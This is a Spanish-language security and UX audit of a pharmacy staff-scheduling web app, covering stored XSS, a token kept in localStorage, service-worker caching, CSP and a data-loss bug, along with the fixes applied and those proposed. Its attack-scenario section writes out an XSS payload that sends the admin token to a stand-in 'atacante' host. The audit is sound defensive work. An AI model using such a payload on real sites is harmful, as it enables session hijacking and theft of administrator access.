# Auditoría UX + Seguridad — Pharmily v19

Fecha: 2026-10-11 · Archivo analizado: `pharmily-v19-index.html` (782 KB, 12.557 líneas) · Entorno: Chromium headless (Playwright) con la API `/api/*` **simulada** (el servidor del NAS no está disponible).

## Estado de las correcciones (aplicadas sobre la v19, ahora en `Pharmily.html`)

| # | Estado | Cambio |
|---|--------|--------|
| 1–3, 5, 9 | ✅ Corregido | `esc()` (reutiliza `asisEsc`) en ~95 puntos: notificaciones (`mensaje`, `id`), usuarios (`displayName`, `username`), nombres, notas, festivos, textos del asistente, títulos y botones del diálogo propio, `e.message` |
| 2 bis | ✅ Corregido | `sanearIdsYColores()` en `migrarDatosFarmacia` (archivo importado y estado del servidor) |
| 4 | ⚠ Mitigado | Sin XSS el token ya no es robable; moverlo a cookie `HttpOnly` requiere cambiar el servidor |
| 6 | ✅ Corregido | Cerrar sesión borra `pharmily_v1` y `pharmily_sync_*` |
| 7 | ✅ Corregido | `pharmily-sw.js` no cachea `/api/` |
| 8 | ✅ Corregido | CSP sin orígenes externos (`connect-src 'self'`, `font-src 'self' data:`) |
| 10 | ✅ Corregido | 69 `<label for>` asociados, `aria-label` en festivos y texto generado; la hoja "Pedir ausencia" del empleado queda `inert` cerrada (antes se llegaba con Tab a campos invisibles) |
| 11 (nuevo) | ✅ Corregido | **Pérdida de datos:** el guardado en el servidor va con 1,5 s de retardo y el cambio no se marcaba como pendiente; recargar/cerrar en ese intervalo hacía que el estado del servidor sobrescribiera lo local. Ahora se marca pendiente al instante y, si el servidor no ha cambiado, se sube lo local |

Verificación: 49 pruebas automáticas (`tests/`) con la API del NAS simulada, pasadas dos veces seguidas. Incluyen ataques XSS por notificaciones, lista de usuarios, vista de empleado, asistente, empleados, plantillas y backup manipulado.

## Qué cambia respecto a la v16 del repositorio
- Supabase desaparece; ahora hay un **servidor propio en el NAS** con API REST (`/api/auth/*`, `/api/state`, `/api/usuarios`, `/api/notificaciones`, `/api/mi-horario`, `/api/backups`).
- **Multiusuario:** cuentas de *administrador* y *empleado*, con contraseña temporal y cambio obligatorio, notificaciones y solicitudes de ausencia de los empleados.
- El token de sesión (`pharmily_auth_token`) se guarda en `localStorage` y se envía como `Authorization: Bearer`.
- **Las correcciones de seguridad hechas en la v16 no están en la v19** (no hay `esc()`, ni CSP, ni saneado de ids/colores).

## Tabla de criticidad

| # | Hallazgo | Criticidad | Cómo se verificó |
|---|----------|-----------|------------------|
| 1 | XSS almacenado en notificaciones (`n.mensaje`, `n.id`) → el código se ejecuta en la sesión del admin | **Crítica** | Navegador: `DIALOG XSS:notif`, `DIALOG 1` |
| 2 | XSS en la tabla de usuarios (`displayName`, `username`) | **Crítica** | Navegador: `DIALOG XSS:displayName`, `XSS:username` |
| 3 | XSS en nombres de farmacia/empleado, notas de ausencia, etc. (145 interpolaciones sin escapar) | **Alta** | Navegador: `XSS:farmacia`, `XSS:empleado` ×9 |
| 4 | Token de admin en `localStorage`: cualquier XSS lo roba → control total de la farmacia | **Alta** | `localStorage.pharmily_auth_token` visible |
| 5 | Cadena empleado → admin: la `nota` de una solicitud de ausencia se pinta sin escapar en el panel del admin (líneas 5009, 5038, 7039) | **Alta** | Código (la API simulada no cubrió solicitudes) |
| 6 | Cerrar sesión solo borra el token: `pharmily_v1` (todos los empleados, teléfonos, notas) se queda en el navegador | Media | Código, línea 10621 |
| 7 | Service worker: con la versión del repo, el mismo origen incluye `/api/*` → cachearía `/api/state`, `/api/usuarios`… | Media | Código (`pharmily-sw.js`) |
| 8 | Sin CSP ni defensa en profundidad | Media | Código |
| 9 | `${e.message}` (texto del servidor) metido en `innerHTML` (línea 10794) | Baja | Código |
| 11 | Pérdida de datos al recargar antes de 1,5 s tras un cambio (detectado por las pruebas) | Media | Navegador |
| 10 | 3 campos sin etiqueta, 1 botón sin nombre, 2 `img` sin `alt` en la vista admin | Baja | Navegador |

Correcto: login con `autocomplete` adecuado, botón de ver contraseña, cambio obligatorio de contraseña temporal, 401 → cierre de sesión, sin dependencias de terceros, sin scroll horizontal en móvil (375 px), `asisEsc()` ya se usa en el asistente de horarios.

## Escenario de ataque realista (#1 + #4 + #5)
1. Un empleado (rol más bajo) envía una solicitud de vacaciones con nota `<img src=x onerror="fetch('https://atacante/?t='+localStorage.pharmily_auth_token)">`.
2. El servidor genera una notificación / la solicitud aparece en el panel del admin.
3. El admin abre la campana o la lista de ausencias → el código se ejecuta y envía su token.
4. Con el token, el empleado llama a `/api/usuarios` y `/api/state` como administrador.

## Correcciones propuestas
1. **Portar `esc()`** de la v16 y aplicarla a todas las interpolaciones de datos (nombres, notas, `mensaje`, `displayName`, `username`, `id`, `e.message`). Mejor aún: que el servidor envíe datos estructurados en las notificaciones y el cliente construya el texto.
2. **Saneado de ids/colores** (`sanearIdsYColores`) igual que en la v16.
3. **Service worker:** excluir la API:
   ```js
   if (url.origin !== self.location.origin || url.pathname.startsWith('/api/')) return;
   ```
4. **Cerrar sesión:** borrar también `pharmily_v1` y las claves `pharmily_sync_*`, y avisar al servidor para invalidar el token.
5. **CSP** (ya no hace falta jsDelivr ni Supabase):
   ```html
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; manifest-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'">
   ```
   Idealmente enviarla como cabecera HTTP desde el servidor del NAS.
6. A medio plazo: token en cookie `HttpOnly; Secure; SameSite=Strict` en lugar de `localStorage`.

## No auditado (necesito el código del servidor)
- Que cada ruta compruebe el rol (p. ej. que un empleado no pueda llamar a `GET /api/state` o `/api/usuarios`).
- Hash de contraseñas, límite de intentos de login, caducidad del token, longitud mínima en servidor.
- HTTPS en el NAS y exposición a internet.
